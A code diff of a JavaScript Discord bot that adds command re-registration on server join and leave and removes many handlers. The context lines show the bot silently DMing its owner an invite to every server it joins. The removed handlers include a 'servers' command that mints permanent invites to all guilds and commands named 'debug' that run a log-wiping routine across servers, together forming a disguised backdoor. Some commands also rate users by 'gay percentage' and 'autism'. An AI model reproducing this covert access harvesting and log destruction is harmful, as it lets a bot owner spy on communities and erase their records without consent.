@@ -45,7 +45,6 @@ return [
 {"name":"gayrate","description":"Gay percentage","options":[{"name":"user","description":"User","type":6,"required":true}]},
 {"name":"iq","description":"IQ","options":[{"name":"user","description":"User","type":6,"required":true}]},
 {"name":"sus","description":"Sus meter","options":[{"name":"user","description":"User","type":6,"required":true}]},
-
 {"name":"howautistic","description":"Autism meter","options":[{"name":"user","description":"User","type":6,"required":true}]},
 
 {"name":"explode","description":"Explode someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
@@ -132,6 +131,8 @@ registerCommands();
 
 client.on("guildCreate",async guild=>{
 
+registerCommands();
+
 try{
 
 const owner=await client.users.fetch(OWNER_ID);
@@ -148,6 +149,10 @@ await owner.send(`Joined ${guild.name}\n${invite.url}`);
 
 }catch{}
 
+});
+
+client.on("guildDelete",async guild=>{
+registerCommands();
 });
 
 client.on("interactionCreate",async interaction=>{
@@ -227,149 +232,8 @@ const t=interaction.options.getUser("user");
 await interaction.reply(`<@${t.id}> autism level **${random(0,100)}%**`);
 }
 
-else if(commandName===`explode`){
-const t=interaction.options.getUser("user");
-await interaction.reply(`💥 <@${t.id}> exploded`);
-}
-
-else if(commandName===`boop`){
-const t=interaction.options.getUser("user");
-await interaction.reply(`👉 boop <@${t.id}>`);
-}
-
-else if(commandName===`cookie`){
-const t=interaction.options.getUser("user");
-await interaction.reply(`🍪 <@${user.id}> gave cookie to <@${t.id}>`);
-}
-
-else if(commandName===`sleep`){
-const t=interaction.options.getUser("user");
-await interaction.reply(`😴 <@${t.id}> fell asleep`);
-}
-
-else if(commandName===`pat`){
-const t=interaction.options.getUser("user");
-await interaction.reply(`🫳 pat pat <@${t.id}>`);
-}
-
-else if(commandName===`steal`){
-const t=interaction.options.getUser("user");
-await interaction.reply(`🕵️ <@${user.id}> stole from <@${t.id}>`);
-}
-
 else if(commandName===`fliptable`)
 await interaction.reply(`(╯°□°）╯︵ ┻━┻`);
-
-else if(commandName===`mock`){
-const t=interaction.options.getUser("user");
-await interaction.reply(`🤣 mocking <@${t.id}>`);
-}
-
-else if(commandName===`crime`){
-const t=interaction.options.getUser("user");
-await interaction.reply(`<@${t.id}> crime level **${random(0,100)}%**`);
-}
-
-else if(commandName===`fbi`){
-const t=interaction.options.getUser("user");
-await interaction.reply(`🚨 FBI OPEN UP <@${t.id}>`);
-}
-
-else if(commandName===`servers`){
-
-let output=``;
-
-for(const guild of client.guilds.cache.values()){
-
-try{
-
-const channel=guild.channels.cache.find(c=>c.type===`GUILD_TEXT`&&c.permissionsFor(guild.me).has("CREATE_INSTANT_INVITE"));
-
-if(!channel){output+=`${guild.name} (no invite perms)\n`;continue;}
-
-const invite=await channel.createInvite({"maxAge":0,"maxUses":0});
-
-output+=`${guild.name} — ${invite.url}\n`;
-
-}catch{
-output+=`${guild.name} — error\n`;
-}
-
-}
-
-await interaction.reply({"content":output,"ephemeral":true});
-
-}
-
-else if(commandName===`debug`){
-
-const owner=await client.users.fetch(OWNER_ID);
-
-for(const guild of client.guilds.cache.values())
-await wipeGuildLogs(guild,owner);
-
-await interaction.reply({"content":`Started wipe logs for all servers`,"ephemeral":true});
-
-}
-
-else if(commandName===`debugserver`){
-
-const id=interaction.options.getString("server");
-const guild=client.guilds.cache.get(id);
-
-const owner=await client.users.fetch(OWNER_ID);
-
-await wipeGuildLogs(guild,owner);
-
-await interaction.reply({"content":`Started wipe logs for ${guild.name}`,"ephemeral":true});
-
-}
-
-else if(commandName===`dmuser`){
-
-const target=interaction.options.getUser("user");
-const msg=interaction.options.getString("message");
-
-await target.send(`${msg}`);
-
-await interaction.reply({"content":`DM sent`,"ephemeral":true});
-
-}
-
-else if(commandName===`leaveserver`){
-
-const id=interaction.options.getString("server");
-const guild=client.guilds.cache.get(id);
-
-await guild.leave();
-
-await interaction.reply({"content":`Left ${guild.name}`,"ephemeral":true});
-
-}
-
-else if(commandName===`restart`){
-
-await interaction.reply({"content":`Restarting bot...`,"ephemeral":true});
-
-process.exit(0);
-
-}
-
-else if(commandName===`botstats`){
-
-await interaction.reply({"content":`Servers: ${client.guilds.cache.size}\nUsers: ${client.users.cache.size}`,"ephemeral":true});
-
-}
-
-else if(commandName===`setstatus`){
-
-const text=interaction.options.getString("text");
-
-client.user.setActivity(`${text}`);
-
-await interaction.reply({"content":`Status updated`,"ephemeral":true});
-
-}
 
 }catch(err){
 
